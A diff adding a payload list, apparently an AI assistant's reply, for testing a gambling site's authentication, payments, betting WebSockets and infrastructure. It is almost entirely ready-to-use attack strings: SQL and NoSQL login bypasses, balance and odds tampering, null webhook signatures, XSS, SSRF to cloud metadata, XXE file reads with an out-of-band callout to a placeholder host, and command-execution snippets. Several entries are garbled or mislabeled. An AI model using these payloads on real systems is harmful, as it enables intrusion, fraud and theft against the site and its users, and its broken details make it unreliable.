@@ -1,0 +1,175 @@
+The comprehensive list of specific testing payloads organized by each target area ensures safe and accurate assessment under the program constraints.
+------------------------------
+## 1️⃣ Area 1: Authentication & Account Management## Step 1: SQL Injection (SQLi) Auth Bypass Multi-Variants
+
+* Standard Tautology (String Breakdown):
+
+' OR '1'='1
+
+* Comment-Based Truncation:
+
+admin' -- -
+
+admin' #
+
+* Numeric-Based Logic (No Quotes Needed):
+
+OR 1=1
+
+* Value Guessing (Sub-Queries):
+
+' OR (SELECT 1)=1--
+
+
+## Step 1: NoSQL Injection Payload Matrix
+
+* Greater Than Operators (Bypass String Matches):
+
+{"username": {"$gt": ""}, "password": {"$gt": ""}}
+
+* Regular Expression Wildcards (Match Any Entry):
+
+{"username": {"$regex": ".*"}, "password": {"$regex": ".*"}}
+
+* Logical Evaluation ($where Clause):
+
+{"$where": "this.username == 'admin' || 1==1"}
+
+
+## Step 3: OAuth / Response Body Manipulation Patterns
+
+* Token Field Swapping (JSON Injection):
+
+{"user":{"id":1,"email":"test@h1.alias","role":"admin"},"token_valid":true}
+
+* Status Object Overrides:
+
+{"error":null,"status_code":200,"verified":true,"auth_state":"SUCCESS"}
+
+
+------------------------------
+## 2️⃣ Area 2: Financial Operations (Deposits, Withdrawals, & Payments)## Step 1 & 3: Parameter Tampering & Currency Manipulation
+
+* Integer Underflow Boundary Test:
+
+amount=-0.01
+
+* Large Integer/Overflow (If bounds checking is absent):
+
+amount=2147483648
+
+* Exponential/Scientific Notation Parsing:
+
+amount=1e-5
+
+* JSON Array-Based Parameter Pollution:
+
+{"transaction": {"amount": 100.00, "amount": 0.01}}
+
+* Type Juggling (Strings vs Floating Integers):
+
+{"amount": "0.01", "currency": "USD"}
+
+
+## Step 2: Webhook Callback Verification Payloads
+
+* Null Cryptographic Signature Strip:
+
+X-Payment-Signature: null
+
+X-Payment-Signature: 00000000000000000000000000000000
+
+* Test Secret Signatures (Using common defaults to check validation):
+If generated with secret passphrases like 123456, test, or secret.
+
+------------------------------
+## 3️⃣ Area 3: Casino & Betting Core Features## Step 2: WebSocket Payload Manipulation
+
+* Bet Multiplier Modification Strings:
+
+{"action":"place_bet","slip":{"stake":0.10,"odds":9999.0,"currency":"USD"}}
+
+* Casino State Machine Modification:
+
+{"event":"slot_spin","payload":{"cheat_mode":true,"forced_outcome":"jackpot"}}
+
+* Session ID De-synchronization:
+
+{"user_id":"YOUR_ID","target_balance_update":5000}
+
+
+## Step 3: Stored & Admin-Targeted Blind XSS Payloads
+
+* SVG/Image OnError Injection Vectors:
+
+<img src=x onerror=alert(document.domain)>
+
+* JavaScript Pseudo-Protocol Links:
+
+javascript:alert(1)
+
+* Iframe Context Breakout Scripts:
+
+"><iframe src="javascript:alert(1)"></iframe>
+
+* Markdown Link Exploits (For support chats or descriptions):
+
+[Click Me](javascript:confirm(1))
+
+
+------------------------------
+## 4️⃣ Area 4: Infrastructure & Input Handling## Step 1: Server-Side Request Forgery (SSRF) Endpoints
+
+* Alternative Localhost IP Formats:
+
+http://2130706433
+
+http://0177.0.0.0.01
+
+http://[::1]
+
+* Cloud Infrastructure Secondary Routes (AWS / GCP / DigitalOcean):
+
+http://169.254.169
+
+http://instance-data/latest/meta-data/
+
+
+## Step 2: XML External Entity (XXE) Multi-DB File Reading
+
+* Local System File Extraction (Linux Variant):
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM "file:///etc/hostname">]>
+<root>&read;</root>
+
+* Local System File Extraction (Windows Target Variant):
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY read SYSTEM "file:///C:/Windows/system.ini">]>
+<root>&read;</root>
+
+* Out-of-Bound (OOB) Testing Block:
+
+<?xml version="1.0"?>
+<!DOCTYPE root [<!ENTITY % remote SYSTEM "http://YOUR_OAST_DOMAIN/evt"> %remote;]>
+
+
+## Step 3: Remote Code Execution (RCE) Web Shell Blocks
+
+* Python Environment Exec Engine Script:
+
+import os; os.system("whoami")
+
+* Node.js (JavaScript Backend Engine) RCE Payload:
+
+require('child_process').execSync('id').toString()
+
+* ASP.NET (Windows Hosting Profile) Command Execution Snippet:
+
+<% Response.Write(System.Diagnostics.Process.Start("cmd.exe", "/c whoami")) % >
+
+
+------------------------------
+Let me know if you would like to begin by setting up the testing structure for Area 1 or if you need to map out the response verification criteria for these payloads.
+
